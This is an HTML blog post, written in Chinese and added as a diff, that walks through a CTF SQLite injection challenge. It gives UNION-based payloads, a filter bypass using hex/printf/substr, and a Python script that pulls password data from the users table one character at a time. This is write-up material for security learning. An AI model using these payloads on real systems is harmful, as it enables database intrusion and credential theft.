@@ -1,0 +1,421 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>一道简单的SQL注入题 - ?___?</title><meta name="author" content="">
+<meta name="author-link" content="">
+<meta name="description" content="easy SQL题目" /><meta name="keywords" content='SQLite, CTF' /><meta itemprop="name" content="一道简单的SQL注入题">
+<meta itemprop="description" content="easy SQL题目">
+
+<meta itemprop="wordCount" content="1607"><meta itemprop="image" content="http://example.org/logo.png"/>
+<meta itemprop="keywords" content="SQLite,CTF," /><meta property="og:title" content="一道简单的SQL注入题" />
+<meta property="og:description" content="easy SQL题目" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://example.org/posts/%E6%9F%90sql%E6%B3%A8%E5%85%A5/" /><meta property="og:image" content="http://example.org/logo.png"/><meta property="article:section" content="posts" />
+
+
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="http://example.org/logo.png"/>
+
+<meta name="twitter:title" content="一道简单的SQL注入题"/>
+<meta name="twitter:description" content="easy SQL题目"/>
+<meta name="application-name" content="FixIt">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://example.org/posts/%E6%9F%90sql%E6%B3%A8%E5%85%A5/" /><link rel="next" href="http://example.org/posts/ciscn-web-filter/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "一道简单的SQL注入题",
+    "inLanguage": "zh-CN",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "http:\/\/example.org\/posts\/%E6%9F%90sql%E6%B3%A8%E5%85%A5\/"
+    },"genre": "posts","keywords": "SQLite, CTF","wordcount":  1607 ,
+    "url": "http:\/\/example.org\/posts\/%E6%9F%90sql%E6%B3%A8%E5%85%A5\/","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "le3teq"
+      },"description": ""
+  }
+  </script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="?___?"><img
+    class="lazyload logo"
+    src="/svg/loading.min.svg"
+    data-src="/fixit.min.svg"
+    data-srcset="/fixit.min.svg, /fixit.min.svg 1.5x, /fixit.min.svg 2x"
+    data-sizes="auto"
+    alt="?___?"
+    title="?___?"/><span class="header-title-text">le3tq&#39; blog</span></a><span id="typeit-header-subtitle-desktop" class="typeit header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/posts/"
+                
+                
+              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 文章</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/categories/"
+                
+                
+              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tags/"
+                
+                
+              ><i class="fa-solid fa-tags fa-archive fa-fw fa-sm" aria-hidden="true"></i> 标签</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ><i class="fa-solid fa-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="搜索文章标题或内容 ..." id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" title="切换主题">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li>
+      </ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="?___?"><img
+    class="lazyload logo"
+    src="/svg/loading.min.svg"
+    data-src="/fixit.min.svg"
+    data-srcset="/fixit.min.svg, /fixit.min.svg 1.5x, /fixit.min.svg 2x"
+    data-sizes="auto"
+    alt="/fixit.min.svg"
+    title="/fixit.min.svg"/><span class="header-title-text">le3tq&#39; blog</span></a><span id="typeit-header-subtitle-mobile" class="typeit header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="搜索文章标题或内容 ..." id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              取消
+            </a>
+          </li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/posts/"
+                  
+                  
+                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 文章</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/categories/"
+                  
+                  
+                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tags/"
+                  
+                  
+                ><i class="fa-solid fa-tags fa-archive fa-fw fa-sm" aria-hidden="true"></i> 标签</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ><i class="fa-solid fa-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item theme-switch" title="切换主题">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><main class="container-reverse" data-page-style="normal"><aside class="toc" id="toc-auto"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside>
+
+  <aside class="aside-custom">
+    </aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX">
+        <span title="转载" class="icon-repost"><i class="fa-solid fa-share fa-fw" aria-hidden="true"></i></span><span>一道简单的SQL注入题</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><i class="fa-solid fa-user-circle" aria-hidden="true"></i>
+      le3teq</span></span>
+          <span class="post-category">收录于 <a href="/categories/ctf/"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> CTF</a></span></div>
+      <div class="post-meta-line"><span title=0001-01-01&#32;00:00:00><i class="fa-regular fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="0001-01-01">0001-01-01</time></span>&nbsp;<span><i class="fa-solid fa-pencil-alt fa-fw" aria-hidden="true"></i> 约 1607 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw" aria-hidden="true"></i> 预计阅读 4 分钟</span>&nbsp;<span id="busuanzi_container_page_pv" class="busuanzi_visitors comment-visitors" data-flag-title="一道简单的SQL注入题">
+            <i class="fa-regular fa-eye fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_page_pv">-</span>&nbsp;次阅读
+          </span>&nbsp;</div>
+    </div><div class="featured-image"><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://s2.loli.net/2023/04/03/1NLlyZoTc75JxaH.png"
+    data-srcset="https://s2.loli.net/2023/04/03/1NLlyZoTc75JxaH.png, https://s2.loli.net/2023/04/03/1NLlyZoTc75JxaH.png 1.5x, https://s2.loli.net/2023/04/03/1NLlyZoTc75JxaH.png 2x"
+    data-sizes="auto"
+    alt="https://s2.loli.net/2023/04/03/1NLlyZoTc75JxaH.png"
+    title="https://s2.loli.net/2023/04/03/1NLlyZoTc75JxaH.png"/></div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>目录</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><blockquote>
+<p>一道简单的 <code>sqlite</code> 数据库的注入题目。</p>
+</blockquote>
+<h4 id="初探">初探</h4>
+<p>开局登录框，贴合实战（</p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://s2.loli.net/2023/04/03/xZ1actyKLeX7rRi.png"
+    data-srcset="https://s2.loli.net/2023/04/03/xZ1actyKLeX7rRi.png, https://s2.loli.net/2023/04/03/xZ1actyKLeX7rRi.png 1.5x, https://s2.loli.net/2023/04/03/xZ1actyKLeX7rRi.png 2x"
+    data-sizes="auto"
+    alt="image-20230403103825597"
+    title="image-20230403103825597"/></p>
+<p>抓包发现返回为0，跑了一下弱口令，无果。</p>
+<p>继续测试SQL，在用户名测试发现<code>'or 1=1 -- </code>返回数据包为111，基本上断定存在注入，暂时来看应该是<code>MYSQL</code>（一般是PHP+MYSQL）布尔注入。</p>
+<h4 id="注入第一回-数据库类型判断">注入第一回-数据库类型判断</h4>
+<p>接上回，在判断是布尔盲注后，开始构造payload进行注入，先手动测试数据库长度，测试payload是否可用</p>
+<pre tabindex="0"><code>&#39;or length(database())&gt;0 --
+</code></pre><p>发现返回0，正常来说应该是返回真，比如</p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://s2.loli.net/2023/04/03/Z6lGqRSTc51zvUJ.png"
+    data-srcset="https://s2.loli.net/2023/04/03/Z6lGqRSTc51zvUJ.png, https://s2.loli.net/2023/04/03/Z6lGqRSTc51zvUJ.png 1.5x, https://s2.loli.net/2023/04/03/Z6lGqRSTc51zvUJ.png 2x"
+    data-sizes="auto"
+    alt="image-20230403111029055"
+    title="image-20230403111029055"/></p>
+<p>所以正常来说应该是返回111，开始思考为什么会出现返回0的情况。简单思考感觉原因可能是</p>
+<ul>
+<li>database等关键字被拦截</li>
+<li>数据库不是MYSQL（但是length函数可以）</li>
+</ul>
+<h5 id="关键字是否被拦截">关键字是否被拦截（×）</h5>
+<p>开始验证，首先是database关键字拦截。注意，这里只能通过构造永真表达式 <code>length('xxx')</code> 来判断关键字是否被拦截，因为用户名我们不知道，可能存在拦截后也返回0的情况</p>
+<p>测试database是否被拦截。</p>
+<pre tabindex="0"><code>&#39;or length(&#39;database()&#39;)&gt;0 --
+</code></pre><p>返回为111，说明不存在该情况。对于其他关键字也可以一一测试。</p>
+<h5 id="数据库不是mysql">数据库不是MYSQL（✓）</h5>
+<p>继续接上回，由于length函数可以执行，排除了一些数据库，可以在这个限定条件下寻找database函数不存在的数据库，查了一圈文档发现可能是SQLite，这里发现了一个小tips，SQLite的time函数可以不传递参数即可返回值。如下</p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://s2.loli.net/2023/04/03/az3o5d4euHcRZSr.png"
+    data-srcset="https://s2.loli.net/2023/04/03/az3o5d4euHcRZSr.png, https://s2.loli.net/2023/04/03/az3o5d4euHcRZSr.png 1.5x, https://s2.loli.net/2023/04/03/az3o5d4euHcRZSr.png 2x"
+    data-sizes="auto"
+    alt="image-20230403113304880"
+    title="image-20230403113304880"/></p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://s2.loli.net/2023/04/03/JtcwPZKkVf6gjbQ.png"
+    data-srcset="https://s2.loli.net/2023/04/03/JtcwPZKkVf6gjbQ.png, https://s2.loli.net/2023/04/03/JtcwPZKkVf6gjbQ.png 1.5x, https://s2.loli.net/2023/04/03/JtcwPZKkVf6gjbQ.png 2x"
+    data-sizes="auto"
+    alt="image-20230403113325601"
+    title="image-20230403113325601"/></p>
+<p>其他数据库基本也需要传递参数，所以基本上判断为SQLite数据库。</p>
+<h4 id="注入第二回-再探注入类型">注入第二回-再探注入类型</h4>
+<p>书接上文的布尔注入，是通过返回包的111返回判断为布尔盲注。下一步就是判断列，由于SQLite和MSYQL注入方法高度相似，可通过 <code>order by</code> 和联合查询来判断列数，这里分析一下两种方法的差异。</p>
+<p><code>order by</code> 是在SQL查询的排序方法，其判断列数时属于盲注判断，而 <code>union</code> 联合查询是可以有回显。</p>
+<p>如下</p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://s2.loli.net/2023/04/03/GYLV5AC6il4hBeN.png"
+    data-srcset="https://s2.loli.net/2023/04/03/GYLV5AC6il4hBeN.png, https://s2.loli.net/2023/04/03/GYLV5AC6il4hBeN.png 1.5x, https://s2.loli.net/2023/04/03/GYLV5AC6il4hBeN.png 2x"
+    data-sizes="auto"
+    alt="image-20230403115005378"
+    title="image-20230403115005378"/></p>
+<p>可以发现 <code>order by</code> 判断时，无回显，联合查询是存在回显。</p>
+<p>所以在注入类型判断时尽量使用 <code>union</code> 联合查询，很可能使盲注变回显。回到这道题，我们使用联合注入进行列数判断。在判断到第五列的时候，发现回显了5</p>
+<pre tabindex="0"><code>1&#39; union select 1,2,3,4,5--
+</code></pre><p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://s2.loli.net/2023/04/03/TeMmiXP39R6sxCd.png"
+    data-srcset="https://s2.loli.net/2023/04/03/TeMmiXP39R6sxCd.png, https://s2.loli.net/2023/04/03/TeMmiXP39R6sxCd.png 1.5x, https://s2.loli.net/2023/04/03/TeMmiXP39R6sxCd.png 2x"
+    data-sizes="auto"
+    alt="image-20230403115557374"
+    title="image-20230403115557374"/></p>
+<p>所以现在盲注就变回显注入了。</p>
+<h4 id="注入第三回-waf绕过">注入第三回-WAF绕过</h4>
+<p>在可回显判断完之后，就应该开始一把梭了，首先探测版本</p>
+<pre tabindex="0"><code>1&#39; union select 1,2,3,4,sqlite_version()--
+</code></pre><p>发现返回为3</p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://s2.loli.net/2023/04/03/J5RroMS8Dj4QqZW.png"
+    data-srcset="https://s2.loli.net/2023/04/03/J5RroMS8Dj4QqZW.png, https://s2.loli.net/2023/04/03/J5RroMS8Dj4QqZW.png 1.5x, https://s2.loli.net/2023/04/03/J5RroMS8Dj4QqZW.png 2x"
+    data-sizes="auto"
+    alt="image-20230403143708900"
+    title="image-20230403143708900"/></p>
+<p>但是通过length判断版本的长度应该为6。猜测页面应该过滤了非int型的输出，waf伪代码应该是</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">waf</span><span class="p">(</span><span class="n">res</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">	<span class="n">new_res</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">for</span><span class="p">(</span><span class="n">s</span> <span class="ow">in</span> <span class="n">res</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="n">s</span> <span class="ow">in</span><span class="s1">&#39;[0-9]&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">			<span class="n">new_res</span> <span class="o">+=</span> <span class="n">s</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">new_res</span>
+</span></span></code></pre></div><p>对于只输出 <code>int</code> 类型，首先想到的应该是进制转换，通过翻查SQLite文档，发现两种方法可以进行进制转换，分别是cast和printf，这里我们用printf来进行转换。一开始的思路是直接将查询的结果，利用hex函数进行16进制转换，然后利用printf转成10进制。如</p>
+<pre tabindex="0"><code>select printf(&#34;%d&#34;,hex(sqlite_version()));
+</code></pre><p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="./images/image-20230403151853706.png"
+    data-srcset="./images/image-20230403151853706.png, ./images/image-20230403151853706.png 1.5x, ./images/image-20230403151853706.png 2x"
+    data-sizes="auto"
+    alt="image-20230403151853706"
+    title="image-20230403151853706"/></p>
+<p>但是这里有个小问题，当hex的结果存在非数字时，printf转换时会忽略结果，如上图。不过由于一般字母数字的16进制不包含字母，所以勉强能接受这个结果。但是忽略的话后续内容怎么办。</p>
+<p>这时想到了截断，利用 <code>substr</code> 来对结果进行截断，这样忽略的内容也在可控范围。</p>
+<p>构造查询数据库表创建语句</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="mi">1</span><span class="s1">&#39; union select 1,2,3,4,printf(&#39;</span><span class="o">%</span><span class="n">d</span><span class="s1">&#39;,hex((select substr(sql,1,1) from sqlite_master WHERE type=&#39;</span><span class="k">table</span><span class="s1">&#39;)))--
+</span></span></span></code></pre></div><p>效果如下</p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://s2.loli.net/2023/04/03/jbKSyMIPg2GHEDX.png"
+    data-srcset="https://s2.loli.net/2023/04/03/jbKSyMIPg2GHEDX.png, https://s2.loli.net/2023/04/03/jbKSyMIPg2GHEDX.png 1.5x, https://s2.loli.net/2023/04/03/jbKSyMIPg2GHEDX.png 2x"
+    data-sizes="auto"
+    alt="image-20230403142541070"
+    title="image-20230403142541070"/></p>
+<p>通过脚本遍历截断查询相关内容，注意返回的6是因为字母16进制转换问题，对应的字母有j，k，l，m，n，o，z（大写+小写，这里可脚本简单遍历一下即可。</p>
+<p>最后如下</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python3" data-lang="python3"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://eci-x.cloudeci1.ichunqiu.com/login.php&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">18</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># passs = &#34;1&#39; union select 1,2,3,4,printf(&#39;%d&#39;,hex((select substr(sql,{},1) from sqlite_master WHERE type=&#39;table&#39;)))-- &#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">passs</span> <span class="o">=</span> <span class="s2">&#34;1&#39; union select 1,2,3,4,printf(&#39;</span><span class="si">%d</span><span class="s2">&#39;,hex((select substr(group_concat(password),</span><span class="si">{}</span><span class="s2">,1) from users)))--&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;Username&#34;</span><span class="p">:</span> <span class="n">passs</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)),</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;Password&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># print(res.text)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">res</span><span class="o">.</span><span class="n">text</span> <span class="o">==</span> <span class="s2">&#34;6&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">flag</span> <span class="o">+=</span> <span class="s2">&#34;6&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">res</span><span class="o">.</span><span class="n">text</span> <span class="o">==</span> <span class="s2">&#34;7&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">flag</span> <span class="o">+=</span> <span class="s2">&#34;7&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">res</span><span class="o">.</span><span class="n">text</span> <span class="o">==</span> <span class="s2">&#34;4&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">flag</span> <span class="o">+=</span> <span class="s2">&#34;4&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">res</span><span class="o">.</span><span class="n">text</span> <span class="o">==</span> <span class="s2">&#34;5&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">flag</span> <span class="o">+=</span> <span class="s2">&#34;Z&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">flag</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">),</span> <span class="mi">16</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">continue</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#users 表</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#id				1</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#username haihaihai</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#password no flagxxxxxx</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#port			111</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#host			haihaihai host</span>
+</span></span></code></pre></div><p>需要注意的是密码后面的16进制转换问题。最后密码为AES密文，加密文件存在，这里不过多描述解密相关。</p>
+<h4 id="注入第四回-回显再研究">注入第四回-回显再研究</h4>
+<p>在赛后回忆了一下，总觉得办法太过笨拙（看了解题数量好像有点多。这里对16进制转换再研究，通过本地测试，发现 <code>printf</code> 在 <code>%d</code> 转换存在缺陷，干脆不用它转换16进制到10进制。</p>
+<p>利用两层16进制编码，即可在回显的时候不存在字符。如</p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://s2.loli.net/2023/04/03/NkfreRiw9mIzndH.png"
+    data-srcset="https://s2.loli.net/2023/04/03/NkfreRiw9mIzndH.png, https://s2.loli.net/2023/04/03/NkfreRiw9mIzndH.png 1.5x, https://s2.loli.net/2023/04/03/NkfreRiw9mIzndH.png 2x"
+    data-sizes="auto"
+    alt="image-20230403155635688"
+    title="image-20230403155635688"/></p>
+<p>到最后发现其实走了一圈弯路，Orz。</p>
+</div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title=0001-01-01&#32;00:00:00>更新于 0001-01-01&nbsp;</span>
+      </div><div class="post-info-license">
+          <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span>
+        </div></div>
+    <div class="post-info-line">
+      <div class="post-info-md"></div>
+      <div class="post-info-share">
+        <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="http://example.org/posts/%E6%9F%90sql%E6%B3%A8%E5%85%A5/" data-title="一道简单的SQL注入题" data-hashtags="SQLite,CTF"><i class="fa-brands fa-twitter fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="http://example.org/posts/%E6%9F%90sql%E6%B3%A8%E5%85%A5/" data-hashtag="SQLite"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="http://example.org/posts/%E6%9F%90sql%E6%B3%A8%E5%85%A5/" data-title="一道简单的SQL注入题" data-image="https://s2.loli.net/2023/04/03/1NLlyZoTc75JxaH.png"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
+  </span>
+      </div>
+    </div>
+  </div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href='/tags/sqlite/' class="post-tag">SQLite</a><a href='/tags/ctf/' class="post-tag">CTF</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+    </section>
+  </div>
+
+  <div class="post-nav">
+      <a href="/posts/ciscn-web-filter/" class="post-nav-item" rel="next" title="CISCN_web_filter">CISCN_web_filter<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered order-3">由 <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.104.3">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.2.17-RC"><img class="fixit-icon" src="/fixit.min.svg" alt="FixIt logo" />&nbsp;FixIt</a>
+        </div><div class="footer-line copyright order-2" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2022 - 2023</span><span class="author" itemprop="copyrightHolder">
+              <a href="/"></a></span><span class="license footer-divider"><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div><div class="footer-line statistics"><span class="site-time" title='网站运行中 ...'><i class="fa-solid fa-heartbeat fa-fw animate-icon" aria-hidden="true"></i><span class="run-times ms-1">网站运行中 ...</span></span></div><div class="footer-line visitor">
+          <span id="busuanzi_container_site_uv" title='总访客数'><i class="fa-regular fa-user fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='总访问量'><i class="fa-regular fa-eye fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
+        </div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
+        </div></div><div id="mask"></div><div class="reading-progress-bar" style="right: 0;top: 0;"></div><noscript>
+    <div class="noscript-warning">FixIt 主题在启用 JavaScript 的情况下效果最佳。</div>
+  </noscript>
